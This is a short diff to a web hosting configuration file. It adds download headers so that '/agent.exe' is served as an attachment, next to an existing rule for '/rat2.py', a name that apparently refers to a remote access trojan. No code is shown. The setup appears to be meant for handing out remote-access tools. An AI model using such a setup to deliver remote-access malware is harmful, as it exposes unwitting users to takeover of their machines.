@@ -6,6 +6,13 @@
   "installCommand": "",
   "headers": [
     {
+      "source": "/agent.exe",
+      "headers": [
+        { "key": "Content-Disposition", "value": "attachment; filename=\"agent.exe\"" },
+        { "key": "Content-Type", "value": "application/octet-stream" }
+      ]
+    },
+    {
       "source": "/rat2.py",
       "headers": [
         { "key": "Content-Disposition", "value": "attachment; filename=\"rat2.py\"" },
